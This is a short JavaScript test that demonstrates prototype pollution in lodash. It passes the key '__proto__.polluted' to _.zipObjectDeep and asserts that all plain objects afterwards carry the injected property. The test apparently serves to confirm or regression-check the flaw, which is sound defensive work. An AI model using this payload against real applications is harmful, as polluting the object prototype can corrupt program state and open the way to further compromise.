test("prototype pollution in lodash", () => {
  expect({}.polluted).toBe(undefined);

  const _ = require("lodash");
  _.zipObjectDeep(["__proto__.polluted"], ["yes"]);

  expect({}.polluted).toBe("yes");
});
